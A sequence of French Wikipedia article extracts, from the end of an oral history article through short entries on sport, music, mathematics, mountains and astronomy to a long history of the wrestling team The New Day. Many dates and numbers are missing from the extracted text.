Les premiers programmes universitaires basés sur l'histoire orale en Amérique voient le jour en 1960. Les archives nationales américaines commencent leurs programmes d'histoire orale dans les bibliothèques présidentielles entre 1961 et 1969. Les projets présidentiels jouent un rôle crucial en plaçant le gouvernement fédéral dans le courant de l'histoire orale. De plus, ils élargissent la définition de l'histoire politique, avec des interviews de personnes influentes, ou non, de l'administration de la Maison Blanche.
Nouveaux outils.
L'histoire orale s'étend considérablement au cours des années 1960. Une partie de cette expansion est due à l'accès au magnétophone à cassette, inventé en 1963.
En 1966, les historiens britanniques fondent "The History Workshop" (l'Atelier d'Histoire) reposant sur la collaboration entre chercheurs, archivistes, conservateurs, historiens locaux et utilisant des travaux amateurs réalisés par des passionnés. L'histoire orale est l'un des outils qui convient à tous. En 1978, le travail de Paul Thompson donne de la crédibilité scientifique aux « histoires cachées » révélées par les interviews. Aux États-Unis, l'approche par le bas s'implante dans les années 1970, lorsque les historiens oraux s'intéressent grandement aux races, aux genres, aux classes et aux communautés locales. Énormément d'ouvrages d'histoire orale sont vendus grâce à la promotion de cette tendance, ce qui permet au mouvement d'être largement reconnu. Les historiens oraux débattent du mérite des interviews des élites ou des personnes plus modestes. Cependant, beaucoup apprécient que les deux approches utilisent la même méthode. Pour avoir une compréhension plus vaste des actions et des contre-actions, des motivations et des résultats de l'histoire humaine, les enquêteurs interrogent tout type de personnes et élaborent des projets qui enregistrent de nombreuses perspectives de différents niveaux. Les projets d'histoire orale deviennent un élément essentiel du programme des universités et des organisations communautaires. Les gouvernements perçoivent aussi la valeur de la collecte d'interviews. Durant la Seconde Guerre mondiale, l'armée américaine envoient des reporters enquêter immédiatement après les batailles sur les expériences de combats vécues par les soldats. Après la Seconde Guerre mondiale, des projets d'interviews des combattants se développent dans chaque camp ; il s'agit d'interroger les stratèges militaires, les prisonniers de guerre, les objecteurs de conscience et ceux qui travaillent à la défense. Parfois, les enquêtes sont internes afin de créer leurs propres archives. D'autres entités collectent aussi des témoignages, tels les parcs nationaux, qui les utilisent pour informer leurs visiteurs ou comme source pour reconstruire des bâtiments.
Expansion.
Le mouvement de l'histoire orale se répand à travers le monde. En Asie, Afrique ou en Amérique Latine, il sert à enregistrer les témoignages de ceux qui ont renversé les anciens ordres et de ceux qui ont souffert sous ces régimes. En Europe de l'Est, les historiens enregistrent les dires de personnes ayant vécu sous le régime communiste , et interrogent les protagonistes des deux camps. Certaines sociétés utilisent l'histoire orale pour comprendre et lutter contre d'anciennes injustices. Les Australiens revoient leurs relations avec les Aborigènes, les Américains et les Canadiens font de même avec les autochtones. En France, le mouvement de l'histoire orale apparaît grâce à la convergence de plusieurs éléments : l'invention du magnétophone, en 1948, et sa diffusion à partir des années 1960. Les sciences sociales adoptent une nouvelle méthode, celle de l'entretien qualificatif. L'histoire orale continue de s'implanter dans le monde scientifique dans la deuxième moitié du siècle grâce à des successions de numéros spéciaux de revues, de colloques internationaux et de tables rondes interdisciplinaires.
L'histoire orale se distingue des autres courants telles l'histoire politique et institutionnelle traditionnelle, réalisée à partir d'archives politiques, ou l'histoire sociale quantitative, fondée sur les statistiques. Cette histoire, engagée, favorise la participation et veut aider les minorités malmenées ou oubliées à obtenir leur reconnaissance historique et culturelle. Un autre élément important est le lien avec l'histoire du temps présent. Cette dernière naît dans les années 1970 et hérite de nombreux témoignages transcrits d'acteurs (déportés, combattants et résistants) de la Seconde Guerre mondiale via l'Institut d'Histoire du Temps Présent, une section du CNRS. De plus, elle veut recueillir de nombreux discours, actions et mémoires des protagonistes encore vivants. L'histoire du temps présent sert de principale porte d'entrée de l'histoire orale anglo-saxonne et européenne en France.
Archives orales.
Le concept alternatif d'« archives orales » est créé par Dominique Aron-Schnapper en 1980 grâce aux résultats d'une enquête concernant le début historique de la Sécurité sociale en France. Cette historienne élabore cette notion après avoir étudié l'histoire orale à l'université de Columbia. L'arrivée de ce concept est suivie de nombreux débats au sein de la communauté historique au cours des années 1980. La théorie est la suivante : « les récits enregistrés des individus acteurs ou témoins étaient des données, des matériaux élaborés pour l'historien et non l'histoire elle-même, que les règles de la critique historique ["devaient"] leur être appliquées comme aux autres documents et qu'une fois déposés et archivés dans des institutions patrimoniales, ces matériaux devenaient des archives et des sources pour l'historien du futur ».
Avancées technologiques.
Les avancées technologiques aident les historiens oraux à conserver les témoignages plus longtemps. Cependant, ces innovations remettent aussi en question cette approche historique. Les études qui n'utilisent pas ces technologies deviennent rapidement démodées et moins utiles.
Les premiers enregistrements audios se font sur des cylindres phonographiques à la fin du . Certains de ces enregistrements survivent et sont copiés sur cassettes et sous forme numérique. L'enregistreur à fil, inventé en 1898, est très encombrant et n'est utilisé que dans des endroits calmes. Les historiens oraux, durant le débarquement de Normandie, ne l'utilisent que dans les bateaux hôpitaux car ils craignaient que le volumineux objet attire l'attention des snipers. En 1948, cet appareil devient obsolète à la suite de l'arrivée du magnétophone. Ce dernier est plus populaire car portable, très fiable, et convient aux enregistrements stéréo. Le magnétophone à bande devient l'outil de base de l'historien oral. Durant la même année, le premier magnétophone commercial est mis en vente. En 1948, le "Columbia Oral History Research Office" ouvre ses portes. Sa méthode consiste à enregistrer les interviews grâce au magnétophone à bande et, ensuite, à retranscrire le témoignage. Dans un premier temps, les interviews sont enregistrés pour être retranscrites ultérieurement, mais, comme les transcriptions ne contiennent pas exactement les mêmes mots, les bandes sont perçues comme sans rapport avec leurs versions écrites. Dans le but d'économiser de l'argent, Columbia enregistre d'autres interviews sur d'anciennes cassettes. Lorsqu'en 1962 quelqu'un s'oppose à cette pratique, le directeur lui répond que conserver tous les enregistrements audios serait trop coûteux. Il rajoute qu'une personne sur cent demande à consulter les enregistrements audios. Cette méthode influence les autres sociétés américaines. L'Europe, contrairement aux États-Unis, suit les préférences britanniques et privilégie l'audio à la transcription. En 1963, la marque Philips présente le magnétophone à cassette compacte. Moins cher et moins encombrant, ce dernier surpasse rapidement le magnétophone à bande. Les archives nationales américaines conservent leurs anciens appareils et transforment les enregistrements sur cassettes audio en enregistrements pour magnétophones à bande.
Dans les années 1980, les États-Unis créent les « Archives Fortunoff » de l'université de Yale, qui travaille sur les survivants de l'Holocauste. Grâce à la Fondation Spielberg, fondée en 1994, cette institution regroupe plus de filmés.
Bibliothèque vivante.
Le fonctionnement de la bibliothèque vivante oppose des lecteurs à des livres vivants, qui choisissent comment ils veulent s'intituler. Les lecteurs sélectionnent les titres dont ils désirent connaître le contenu. Puis, les documents vivants se livrent à leur emprunteur. Une supervision par les bibliothécaires tout au long du processus est importante afin d’éviter les mauvaises expériences.
Né en 2000 au festival de musique Roskilde au Danemark grâce à l’initiative de « Stop the violence », une organisation non gouvernementale opposée au racisme, le concept de bibliothèque vivante a dès de départ pour objectif de déconstruire les mécanismes de la violence subie par les minorités. Le premier évènement regroupe de jeunes participants et leur propose de faire face au préjugé en rencontrant l’inconnu et l’Autre. Les organisateurs les invitent à rencontrer le préjugé à la place d’en parler. Les notions d’ouverture d’esprit et de visite des traumas associés à la violence, leitmotivs de la bibliothèque vivante, reflètent les thèmes phares qu’a pris l’histoire orale en général au tournant du millénaire. L’une des forces de cet exercice réside dans son effet de cohésion sociale : elle renforce les liens parmi un groupe en luttant contre l’exclusion et en favorisant la participation.
Dès leur naissance, les bibliothèques vivantes n’auront jamais été restreintes à l’espace de la bibliothèque institutionnelle, mais celle-ci n’en demeure pas moins un lieu privilégié où tenter l’exercice et où pratiquer l’histoire orale en général.
Éthique.
Selon les personnes responsables du processus de recherche et d’archivage, les projets centrés sur l’histoire orale peuvent résulter en des usages plus ou moins constructifs des témoignages. Certains font de la récupération rhétorique des contenus, par exemple en représentant la souffrance des narrateurs pour sa grande efficacité émotionnelle. C’est entre autres pourquoi des voix au proposent des modèles collaboratifs ou participatifs de recherche et d’archivage en histoire orale. Cet esprit concorde avec la volonté de cocréation propre à plusieurs disciplines, qui désirent travailler « avec » la communauté que de travailler « sur » elle. Les rôles peuvent même s’inverser dans des situations où la frontière entre intervieweurs et interviewés se brouille. Certains projets conjoints fonctionnent selon le principe inusité de mise en commun des recherches, aucune entrevue n’appartenant à un membre particulier de l’équipe. Un problème se pose parfois dans les projets participatifs où le choix du degré de confidentialité revient aux interviewés, qui risquent alors de voir leur entrevue omise des résultats de recherche en fonction de leur décision. Dans d’autres cas, le partage des données est obligatoire, car il est exigé par certains organismes subventionnaires. Cela entraîne des conséquences dans le cas de l’histoire orale : non seulement les chercheurs renoncent à une partie de leur propriété intellectuelle, mais la récupération des données hors contexte.
On recommande aussi un partenariat étroit avec les peuples autochtones, longtemps victimes de racisme institutionnel de la part des musées et des chercheurs. Lentement mais sûrement, ces peuples commencent à avoir voix au chapitre en ce qui concerne la préservation de leur histoire orale. Au Canada, la recherche a récemment pris un virage déontologique grâce auquel les entrevues menées dans une communauté autochtone nécessitent désormais une autorisation en amont de la part de son comité éthique. Cette prise de contrôle des autochtones sur leur histoire s’étend aux bases de données, comme en Australie, où on voit naître des dépôts numériques en phase avec la vision autochtone des systèmes de gestion et adaptable selon les spécificités de chaque communauté.
Des chercheurs contemporains constatent, en faisant l’expérience de l’histoire orale, que celle-ci exige davantage qu’un cadre éthique prédéfini auquel il faut apposer sa signature. Selon eux, il ne faut pas négliger l’écoute active, l’adaptabilité à la personne qui parle, à son discours et à l’espace environnant ainsi qu’une prédisposition à accueillir le récit dans ses dimensions les plus difficiles.

</doc>
<doc id="8979510" url="https://fr.wikipedia.org/wiki?curid=8979510" title="Tournoi de tennis d'Autriche (WTA 1979)">
Tournoi de tennis d'Autriche (WTA 1979)

Le tournoi de tennis d'Autriche est un tournoi de tennis professionnel féminin. L'édition 1979 se dispute à Kitzbühel du 23 au .
Hana Mandlíková remporte le simple dames. En finale, elle bat Sylvia Hanika, décrochant à cette occasion le de sa carrière sur le circuit WTA.
L'épreuve de double voit quant à elle s'imposer Helen Anliot et Diane Evers.

</doc>
<doc id="8979513" url="https://fr.wikipedia.org/wiki?curid=8979513" title="Give Me Something">
Give Me Something

Give Me Something est une chanson du DJ français David Guetta en collaboration avec la chanteuse américaine Barbara Tucker. Cette chanson, extraite de l'album "Just A Little More Love", est sortie en single le .
Format et liste des pistes.
CD single

</doc>
<doc id="8979514" url="https://fr.wikipedia.org/wiki?curid=8979514" title="Michael Harris (mathématicien)">
Michael Harris (mathématicien)

Michael Harris est un mathématicien américain né en 1954. Il est professeur à l’Institut de mathématiques Jussieu-Paris Rive Gauche à l’université Paris Diderot.
Biographie.
Harris obtient son doctorat à l'université Harvard en 1977, sous la direction de Barry Mazur. Sa thèse, intitulée "On "p"-Adic Representations Arising from Descent on Abelian Varieties", est ensuite publiée dans la revue "Compositio Mathematica".
Travaux.
Il apporte des contributions notables au programme de Langlands, en particulier pour ses travaux avec Richard Taylor, qui conduisent à la démonstration des conjectures de Langlands locales pour le groupe linéaire GL("n") d'un corps "p"-adique.
En 2008, il démontre, en collaboration avec Laurent Clozel, Richard Taylor et , la conjecture de Sato-Tate pour les courbes elliptiques de "j"-invariant non entier.
Honneurs et récompenses.
En 2006, il est lauréat du prix Sophie-Germain de la fondation Sophie Germain sur proposition de l'Académie des sciences.
En 2007, Harris et Taylor reçoivent le Clay Research Award en 2007.

</doc>
<doc id="8979515" url="https://fr.wikipedia.org/wiki?curid=8979515" title="Stop (chanson)">
Stop (chanson)



</doc>
<doc id="8979518" url="https://fr.wikipedia.org/wiki?curid=8979518" title="Walili">
Walili



</doc>
<doc id="8979520" url="https://fr.wikipedia.org/wiki?curid=8979520" title="Global Wars (2015)">
Global Wars (2015)

L'édition 2015 de Global Wars est un " produit par la Ring of Honor (ROH) et par la New Japan Pro Wrestling (NJPW), qui est disponible uniquement en ligne et par Ustream. Cette manifestation de catch se déroulera les 15 et au Ted Reeve Arena à Toronto en Ontario au Canada. Il s'agit de la de Global Wars de l'histoire de la ROH. C'est également le quatrième évènement à être produit par ces deux fédérations et le deuxième cette année.
Production.
Le , lors de ', la New Japan Pro Wrestling annonce pour la deuxième année consécutive la production de deux shows événementiels entre les deux fédérations. Le , la Ring of Honor annonce qu'il y aura finalement trois spectacles coproduits par les deux fédérations cette année, dont deux dates prévues pour '.
Contexte.
Les spectacles de la Ring of Honor et de la New Japan Pro Wrestling en paiement à la séance sont constitués de matchs aux résultats prédéterminés par les scénaristes de la ROH et de la NJPW. Ces rencontres sont justifiées par des ' - une rivalité avec un catcheur, la plupart du temps - ou par des qualifications survenues au cours de shows précédant l'évènement. Tous les catcheurs possèdent un ', c'est-à-dire qu'ils incarnent un personnage face (gentil) ou heel (méchant), qui évolue au fil des rencontres. Un ' comme ' est donc un événement tournant pour les différentes " en cours.

</doc>
<doc id="8979521" url="https://fr.wikipedia.org/wiki?curid=8979521" title="Oral history">
Oral history



</doc>
<doc id="8979523" url="https://fr.wikipedia.org/wiki?curid=8979523" title="Rohnenspitze">
Rohnenspitze

La Rohnenspitze (aussi Ronenspitze ou Rhonenspitze) est une montagne culminant à d'altitude dans les Alpes d'Allgäu.
Toponymie.
La Rohnenspitze est mentionné pour la première fois Dans l""' de Peter Anich en 1774 sous le nom de "Rane Spitz". Le nom viendrait du mot médiéval "Rohne", signifiant « chablis ».
Géographie.
Le sommet est sur la limite entre les communes de Zöblen à l'ouest et de Tannheim à l'est. Il domine la vallée de Tannheim.
Au sud se trouve le Gaishorn () et à l'ouest le Ponten ().
Ascension.
Plusieurs sentiers de randonnée balisés mènent à la Rohnenspitze. La voie la plus facile (Weg 62) part de Zöblen puis prend la crête rocheuse au nord jusqu'à la croix et au sommet.
Depuis Tannheim, une variante de la Via Alpina mène au weg 59. Le weg 423 va de la vallée de l'Ostrach jusqu'au Willersalpe.
En hiver, la Rohnenspitze est un lieu apprécié pour le ski hors piste.

</doc>
<doc id="8979525" url="https://fr.wikipedia.org/wiki?curid=8979525" title="Mont Dainichi">
Mont Dainichi

Le est une montagne située sur le territoire des villes de Gujō et Takayama dans la préfecture de Gifu au Japon. Culminant à d'altitude, il fait partie des monts Ryōhaku.
La pluie qui tombe sur les pentes du mont Dainichi alimente la rivière Nagara et les deux fleuves Shō et Kuzuryū.

</doc>
<doc id="8979526" url="https://fr.wikipedia.org/wiki?curid=8979526" title="Stop!">
Stop!



</doc>
<doc id="8979531" url="https://fr.wikipedia.org/wiki?curid=8979531" title="Pseudoplexaura">
Pseudoplexaura

Pseudoplexaura est un genre d'octocoralliaires (similaires aux gorgones) de la famille Plexauridae. Les espèces de ce genre se développent en formant des colonies de grandes ramifications ressemblant à des arbres ; elles sont originaires des récifs de la mer des Antilles et du golfe du Mexique.
Liste d'espèces.
Selon :
Description.
Les espèces du genre "Pseudoplexaura" sont visqueuses au toucher et grandissent rapidement.

</doc>
<doc id="8979543" url="https://fr.wikipedia.org/wiki?curid=8979543" title="(164215) Doloreshill">
(164215) Doloreshill

(164215) Doloreshill est un astéroïde Amor découvert le par le Catalina Sky Survey.

</doc>
<doc id="8979553" url="https://fr.wikipedia.org/wiki?curid=8979553" title="Modèle d'accrétion de cœur">
Modèle d'accrétion de cœur

L'accrétion de cœur (calque de l'anglais '), ou cœur solide, est le modèle sur lequel sont principalement basées les théories actuelles de la formation planétaire.
D'après ce modèle, un cœur d'éléments lourds (ou métaux) est d'abord formé par accrétion dans le disque protoplanétaire.
Historique.
L'accrétion de cœur a été introduite en 1996 par et ses collaborateurs.
Scénario.
Dans ce modèle, lorsqu'une étoile se forme, les particules solides (roches et glaces) du disque qui l'entoure s'agrègent par endroits et forment des planétésimaux. Certains de ces planétésimaux finissent eux aussi par s'assembler jusqu'à former des corps solides de masse planétaire, entre la masse de la Lune et une dizaine de fois la masse de la Terre, en un ou deux millions d'années. Une fois ce temps passé, l'accrétion de matériaux solides ralentit fortement et, si la masse de ces « cœurs » est suffisante et dans une zone où du gaz est encore présent, ils peuvent alors accréter une atmosphère gazeuse. Cette première accrétion, assez lente, est à peu près linéaire et mène à des corps de 20 à 30 masses terrestres contenant une proportion (en masse) comparable de matériaux solides et gazeux. Lorsque la masse du cœur (éventuellement entourée de cette fine atmosphère) atteint cette masse critique, l'accrétion s'emballe : on parle alors d'accrétion exponentielle ("" en anglais). Le gaz environnant s'effondre sur la planète et la quantité de gaz accrétée augmente alors très vite : c'est ainsi que se forment, pense-t-on, les géantes gazeuses. Ces cœurs peuvent ainsi finir par accumuler une masse de gaz plusieurs fois supérieure au cœur solide initial. On pense ainsi que Jupiter, environ 318 fois plus massive que la Terre, a un noyau d'une dizaine de masses terrestres, et que Saturne, dont la masse est d'environ 95 fois celle de la Terre, a un noyau d'une quinzaine de masses terrestres.

</doc>
<doc id="8979554" url="https://fr.wikipedia.org/wiki?curid=8979554" title="Liste des conseillers départementaux des Alpes-de-Haute-Provence">
Liste des conseillers départementaux des Alpes-de-Haute-Provence



</doc>
<doc id="8979555" url="https://fr.wikipedia.org/wiki?curid=8979555" title="The New Day">
The New Day

The New Day est une équipe de catcheurs ' composée de Kofi Kingston et Xavier Woods. Le duo travaille à la , dans la division '.
Devenus l'une des équipes les plus emblématiques de l'histoire de la WWE, ils sont 7 fois champions par équipes de ', 4 fois champions par équipes de ' et 1 fois champions par équipes de "". De ce fait, avec 12 titres par équipe remportés, il s'agit de l'équipe la plus titrée de l'histoire de la WWE (ayant dépassé le record détenu par les Dudley Boyz et les Hardy Boyz avec 9 titres).
Par ailleurs, ils détiennent le record de longévité des titres par équipe de "Raw" avec , ainsi que le record du nombre de règnes en tant que champions par équipe de "SmackDown" avec 7 règnes.
Histoire du groupe.
World Wrestling Entertainment (2014-...).
Formation du groupe (2014).
Le à "", Kofi Kingston et Big E perdent face à Ryback et Curtis Axel. Après le combat, Xavier Woods fait son apparition et annonce vouloir se joindre aux deux catcheurs.
Le à ', les trois catcheurs font leurs débuts, disputent leur premier match et ensemble, ils battent Curtis Axel et Slater Gator (Heath Slater et Titus O'Neil dans un '. Le lors du pré-show à "", les deux premier catcheurs battent Goldust et Stardust.
Doubles champions par équipes de la WWE (2015-2016).
Le au ', ils entrent dans le ' en et positions, mais se font éliminer par Rusev après 3 et 15 minutes de match.
Le à ', ils perdent face aux Lucha Dragons. Après le combat, ils effectuent un ' et attaquent leurs adversaires. 20 soirs plus tard à ', Kofi Kingston et lui deviennent les nouveaux champions par équipes de la WWE en battant Cesaro et Tyson Kidd et remportent les titres pour la première fois de leurs carrières. Le à ', ils conservent leurs titres en rebattant leurs mêmes adversaires. 14 soirs à ', ils conservent leurs titres et remportent leur tout premier '. Le à ", Big E et Xavier Woods ne conservent pas leurs ceintures, battus par The Prime Time Players.
Le à ', Kofi Kingston et Big E ne remportent pas les ceintures, rebattus par leurs mêmes adversaires. Le à ', ils redeviennent champions par équipes, pour la seconde fois, en prenant leur revanche sur leurs mêmes opposants et en battant les Lucha Dragons et Los Matadores dans un '. Le à ', ils perdent face aux Dudley Boyz par disqualification à la suite d'une intervention extérieure de Xavier Woods, mais conservent leurs titres.
Le à ', ils conservent leurs titres en prenant leur revanche sur leurs mêmes adversaires. Le aux ', The League of Nations (Sheamus et King Barrett) et les trois catcheurs perdent face à Ryback, les Usos et les Lucha Dragons dans un '. Le à ', Kofi Kingston et Big E conservent leurs titres en prenant leur revanche sur les deux précédentes équipes adverses dans un ".
Le au ', ils conservent leurs titres en battant The Usos. Le à ', ils effectuent un "" et conservent leurs titres en battant League of Nations (Sheamus et King Barrett).
Le à ', les trois catcheurs perdent face à Legue of Nations (Sheamus, Rusev et Alberto Del Rio) dans un '. Le à ', Kofi Kingston et Big E conservent leurs titres en battant The Vaudevillains (Aiden English et Simon Gotch). Le à "Money in the Bank", ils conservent leurs titres en rebattant leurs mêmes adversaires et en battant Enzo Amore, Big Cass et The Good Brothers dans un '.
Le à ', les trois catceurs perdent face à la Wyatt Family dans un '. Le à ', ils perdent face aux Good Brothers par disqualification, mais conservent leurs titres. Le à ', ils conservent leurs titres en prenant leur revanche sur leurs même adversaires.
Le à ', ils perdent face à The Bar par disqualification, mais conservent leurs titres. Le aux ', l'équipe ', dont les trois catcheurs font partie, bat celle de ' dans un '. Le à ', ils ne conservent pas leurs ceintures, battus par The Bar.
Draft à ', septuples champions par équipes de ', Kofi Kingston champion de la WWE et séparation (2017-2020).
Le au ', ils entrent dans le ' en , et positions, mais se font éliminer par The Bar après 16, 10 et 5 minutes de match.
Le à "", lors du Superstar Shake-Up, le trio est annoncé être officiellement transféré au show bleu.
Le à ', ils deviennent les nouveaux champions par équipes de ' en battant les Usos, remportent les titres pour la première fois de leurs carrières et leurs seconds titres par équipes. Le lors du pré-show à ', ils ne conservent pas leurs ceintures, battus par leurs mêmes adversaires. Le à ', ils redeviennent champions par équipes de ', pour la seconde fois, en prenant leur revanche sur leurs mêmes opposants dans un '.
Le à ', ils ne conservent pas leurs ceintures, rebattus par leurs même rivaux dans leur tout premier '. Le aux ', ils perdent face au Shield dans un '. Le à ', ils ne remportent pas les ceintures, rebattus par les jumeaux dans un ' qui inclut également Rusev Day (Rusev et Aiden English), Chad Gable et Shelton Benjamin.
Triples champions par équipe de "SmackDown" (2018).
Le au ', ils entrent dans le ' en , et positions, mais se font éliminer par Jinder Mahal et Andrade "Cien" Almas après 14, 8 et 5 minutes de match. Le à "", ils affrontent les Usos pour les ceintures, mais la rencontre se termine en match nul, car The Bludgeon Brothers attaquent les deux équipes.
Le à ', ils ne remportent pas les ceintures, battus par leurs nouveaux adversaires dans un ' qui inclut également les catcheurs samoans. Le au "Greatest Royal Rumble", Xavier Woods entre dans le "Royal Rumble Match" en position, mais se fait éliminer par Elias.
Le lors du pré-show à "Extreme Rules", ils perdent face à SAnitY dans un "Tables match". Le à "SummerSlam", Big E et lui battent The Bludgeon Brothers par disqualification, mais ne remportent pas les titres par équipe de "SmackDown". Le à "SmackDown Live", Kofi Kingston et lui deviennent, pour la troisième fois, champions par équipe de "SmackDown" en battant les Bludgeon Brothers dans un "No Disqualification Match".
Le à "Super Show-Down", ils conservent leurs titres en battant The Bar. Le à "SmackDown Live 1000", Big E et lui perdent face à The Bar, ne conservant pas leurs titres. Le à "Crown Jewel", Big E et Kofi Kingston ne remportent pas les titres par équipe de "SmackDown", battus par The Bar. Le lors du pré-show aux "Survivor Series", l'équipe "SmackDown" (les Usos, SAnitY, The Club (les Good Brothers), The Colóns, Big E et lui) perd face à celle de "Raw" (Bobby Roode, Chad Gable, les Revival, la B-Team, Lucha House Party et The Ascension) dans un "10-on-10 Traditional Survivor Series Elimination Tag Team Match".
Champion de la WWE et quintuples champions par équipe de "SmackDown" (2019).
Le au "Royal Rumble", ils entrent dans le "Royal Rumble" masculin en , et positions, mais se font éliminer par Samoa Joe et Drew McIntyre. Le à "Elimination Chamber", Kofi Kingston ne remporte pas le titre de la WWE, battu par "The New" Daniel Bryan dans un "Elimination Chamber Match", qui inclut également AJ Styles, Jeff Hardy, Randy Orton et Samoa Joe. Le lors du pré-show à "Fastlane", Xavier Woods et Big E battent Rusev et Shinsuke Nakamura. De son côté, Kofi Kingston perd face à The Bar dans un "1-on-2 Handicap Match". Le à "SmackDown Live", Big E et Xavier Woods gagnent le "Tag Team Gauntlet Match" en battant successivement Luke Gallows et Karl Anderson, Shinsuke Nakamura et Rusev (accompagné de Lana), The Bar, les Usos (par forfait), "The New" Daniel Bryan et Erick Rowan, permettant ainsi à leur partenaire Kofi Kingston d'obtenir un match pour le titre de la WWE à "WrestleMania 35". Après leur victoire, les membres du New Day sont félicités et applaudis par les Superstars "Faces" du roster.
Le à "WrestleMania 35", Kofi Kingston devient le nouveau champion de la WWE en battant "The New" Daniel Bryan, remportant le titre pour la première fois de sa carrière. Il devient le Grand Slam Champion de la fédération, ainsi que le premier catcheur né en Afrique à devenir champion de la WWE. Le , Big E souffre d'une blessure au ménisque et doit s'absenter pendant deux mois. Le à "Money in the Bank", Kofi Kingston conserve son titre en battant Kevin Owens. Le à "Super ShowDown", Kofi Kingston conserve son titre en battant Dolph Ziggler, grâce à une intervention extérieure de Xavier Woods. Le à "SmackDown Live", Big E effectue son retour de blessure. Ses frères et lui battent Dolph Ziggler, Kevin Owens et Sami Zayn dans un "6-Man Tag Team Match". Le à "Stomping Grounds", Xavier Woods et Big E perdent face à Kevin Owens et Sami Zayn. Plus tard dans la soirée, Kofi Kingston conserve son titre en battant le même adversaire dans un "Steel Cage Match".
Le à "Extreme Rules", Xavier Woods et Big E redeviennent champions par équipe de "SmackDown", en battant Rowan, "The New" Daniel Bryan et Heavy Machinery dans un "Triple Threat Tag Team Match", remportant les titres pour la quatrième fois. De son côté, Kofi Kingston conserve son titre en battant Samoa Joe, puis célèbre, avec ses frères, leur victoire pour les titres par équipe de "SmackDown". Le à "SummerSlam", Kofi Kingston et Randy Orton se quittent sur un "Double Count Out", mais il conserve son titre. Après le match, il attaque ce dernier avec une chaise et lui porte son "Trouble in Paradise". Le à "Clash of Champions", Big E et Xavier Woods perdent face aux Revival, ne conservant pas leurs titres. Plus tard dans la soirée, Kofi Kingston conserve son titre en prenant sa revanche sur son adversaire.
Le à "SmackDown", Kofi Kingston perd face à Brock Lesnar en moins de 10 secondes, ne conservant pas son titre, mettant ainsi fin à 180 jours de règne. Le lors d'un live event, Xavier Woods se blesse au tendon d'Achille, ce qui l'éloignera des rings pour une durée de 6 mois à un an. Le à "SmackDown", Big E et Kofi Kingston redeviennent champions par équipe de "SmackDown" en battant les Revival, remportant les titres pour la cinquième fois. Le lors du pré-show aux "Survivor Series", ils perdent le " Champions vs Champions vs Champions Triple Threat Tag Team Match" face aux champions par équipe de "Raw", les Viking Raiders, qui inclut également les champions par équipe de la "NXT", l'Undisputed Era. Le à "", ils conservent leurs titres en battant les Revival dans un "Ladder match".
Septuples champions par équipe de "SmackDown" et séparation du trio (2020).
Le au "Royal Rumble", ils entrent dans le "Royal Rumble" masculin en et position, mais se font tous deux éliminer par Brock Lesnar. Le à "Super ShowDown", ils perdent face à John Morrison et The Miz, ne conservant pas leurs titres. Le à "Elimination Chamber", ils ne remportent pas les titres par équipe de "SmackDown", battus par leurs mêmes adversaires dans un "Elimination Chamber Match", qui inclut également les Usos, les Dirty Dawgs, Heavy Machinery et Lucha House Party.
Le à "WrestleMania 36", Kofi Kingston ne remporte pas les titres par équipe de "SmackDown", battu par John Morrison dans un "Triple Threat Ladder Match", qui inclut également Jimmy Uso. Le à "SmackDown", son partenaire Big E permet au New Day de redevenir champions par équipe de "SmackDown" en battant le Miz et Jey Uso dans un "Triple Threat Match", remportant les titres pour la sixième fois. Le à "Money in the Bank", ils conservent leurs titres en battant Lucha House Party, le Miz, John Morrison et The Forgotten Sons dans un "Fatal 4-Way Tag Team Match".
Le à "Extreme Rules", ils perdent face à Cesaro et Shinsuke Nakamura dans un "Tables Match", ne conservant pas leurs titres. Le à "SmackDown", Kofi Kingston annonce être blessé et encourage Big E à s'illustrer en solo (étant donné ses deux frères ne peuvent pas combattre).
Le à "SmackDown", Big E bat Sheamus dans un "Falls Count Anywhere Match". Kofi Kingston et Xavier Woods effectuent leurs retours de blessure et redeviennent champions par équipe de "SmackDown" en battant Cesaro et Shinsuke Nakamura, remportant les titres pour la septième fois. Mais lors du dernier round du Draft, Stephanie McMahon annonce les transferts des champions du show bleu à "Raw", tandis que Big E restera seul à "SmackDown", ce qui entraîne la séparation du trio.
Quadruples champions par équipe de "Raw" (2020-2021).
3 soirs plus tard à "Raw", à la suite du transfert des Street Profits à "SmackDown", les deux équipes échangent leurs titres respectifs, Kofi Kingston et Xavier Woods devenant les champions par équipe de "Raw" pour la troisième fois. Plus tard dans la soirée, ils conservent leurs titres en battant les Dirty Dawgs. Le aux "Survivor Series", ils perdent face aux Street Profits dans un "Champions vs. Champions Tag Team match". Le à "", ils perdent face à Cedric Alexander et Shelton Benjamin, ne conservant pas leurs titres.
Le au "Royal Rumble", Xavier Woods entre dans le "Royal Rumble" masculin en position, mais se fait éliminer par Mustafa Ali. Le à "Raw", ils redeviennent champions par équipe de "Raw" en battant le Hurt Business (Cedric Alexander et Shelton Benjamin), remportant les titres pour la quatrième fois. Après le combat, AJ Styles et Omos les défient pour leurs titres à "WrestleMania 37".
Le à "WrestleMania 37", ils perdent face à AJ Styles et Omos, ne conservant pas leurs titres.
Le à "Money in the Bank", Kofi Kingston ne remporte pas le titre de la WWE, battu par Bobby Lashley par soumission.
Retour du trio, Big E Champion de la WWE, Xavier Woods King of the Ring et champions par équipe de la "NXT" (2021-2023).
Le à ', Big E utilise sa mallette sur Bobby Lashley qui venait de conserver sa ceinture contre Randy Orton, devient le nouveau champion de la WWE en le battant et remporte le titre pour la première fois de sa carrière. Après sa victoire, il est félicité par ses deux compères, ce qui marque le retour du trio. Le à ', ils battent AJ Styles, Bobby Lashley et Omos dans un "".
Le à ', lors du Draft, Big E est annoncé être officiellement transféré au show rouge, alors que de leur côté, Kofi Kingston et Xavier Woods sont annoncés être officiellement transférés au show bleu par Sonya Deville, ce qui entraîne, une nouvelle fois, la séparation du trio. Le à ', Xavier Woods devient le troisième "King of the Ring" en battant Finn Bálor en finale du tournoi.
Le à ', Kofi Kingston et King Woods ne remportent pas les titres par équipes de "SmackDown", battus par les Usos. Le , King Woods se blesse au muscle plantaire du mollet et doit s'absenter pour une durée indéterminée. Le au ', Kofi Kingston et Big E entrent respectivement dans le ' en et positions, mais se font éliminer par Kevin Owens et RK-Bro (Randy Orton et Riddle). Le jour même, Big E est transféré à ', ce qui marque son retour dans le trio. Le , Big E souffre d'une blessure à la nuque et doit s'absenter pendant une durée indéterminée. Le à ", Xavier Woods fait son retour de blessure et bat Ridge Holland.
Le à ", Kofi Kingston et lui perdent face aux Brawling Brutes (Sheamus et Ridge Holland).
Le à "", ils deviennent les nouveaux champions par équipes de "NXT" en battant Pretty Deadly (Kit Wilson et Elton Prince), remportant les titres pour la première fois de leurs carrières.
